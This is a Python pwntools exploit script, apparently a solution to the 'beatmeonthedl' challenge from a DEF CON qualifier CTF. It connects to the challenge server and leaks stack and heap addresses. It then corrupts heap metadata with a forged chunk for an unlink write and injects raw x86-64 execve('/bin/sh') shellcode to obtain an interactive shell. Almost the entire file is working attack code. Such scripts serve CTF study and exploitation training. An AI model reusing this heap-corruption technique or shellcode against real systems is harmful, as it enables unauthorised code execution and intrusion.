from pwn import *

context.log_level = 'debug'

#s=process('./beatmeonthedl')
s = remote('beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me', 6969)
def login(id,password):
    print s.recvuntil('username:')
    s.send('mcfly')
    print s.recvuntil('Pass:')
    s.send('awesnap')

def Request(msg):
    print s.recvuntil('|')
    s.sendline('1')
    print s.recvuntil('text >')
    s.send(msg)


def Change(choice, msg):
    print s.recvuntil('|')
    s.sendline('4')
    print s.recvuntil('choice:')
    s.sendline(str(choice))
    print s.recvuntil('data:')
    s.send(msg)

def delete(choice):
    print s.recvuntil('|')
    s.sendline('3')
    print s.recvuntil('choice:')
    s.sendline(str(choice))

def print_(choice):
    print s.recvuntil('|')
    s.sendline('3')
    print s.recvuntil('choice:')
    s.sendline(str(choice))
    print s.recv(1024)

s.send('a'*16)
s.recvuntil('a'*16)
leak_stack = u64(s.recvuntil('\x7f').ljust(8,'\x00'))
s.sendline('mcfly')
s.sendline('a'*0x18)
s.recvuntil('a'*0x18)
leak_heap = u64(s.recvuntil('\n')[:-1].ljust(8,'\x00'))
print '[*] Leak Stack : %x' % leak_stack
print '[*] Leak Heap : %x' % leak_heap

s.sendline('mcfly')
s.sendline('awesnap')

Request('B'*0x38)
Request('C'*0x38)
Request('D'*0x38)
sc = ''
sc+="\x48\x31\xd2"
sc+="\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
sc+="\x48\xc1\xeb\x08"
sc+="\x53"
sc+="\x48\x89\xe7"
sc+="\x50"
sc+="\x57"
sc+="\x48\x89\xe6"
sc+="\xb0\x3b"
sc+="\x0f\x05"
Request(sc)
#Request("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
#Request('F'*0x38)

payload=p64(0x0)
payload+=p64(0x20)
payload+=p64(0x609e80-0x18)
payload+=p64(0x609e80-0x10)
payload+=p64(0x609e80-0x18) #vlun 0x609e80=0x609380-0x18
payload+=p64(0x609e80-0x10)
payload+=p64(0x20)
payload+=p64(0x42)
payload+=p64(0x609e80-0x18)
payload+=p64(0x609e80-0x10)
payload+='B'*16

Change(0,payload)
delete(1)


Change(0,p64(0x0000000000609958)*10)
print '[*] Leak Stack : %x' % leak_stack
print '[*] Leak Heap : %x' % leak_heap
raw_input()
Change(1,p64(leak_heap+0x256-512+170))


s.interactive()
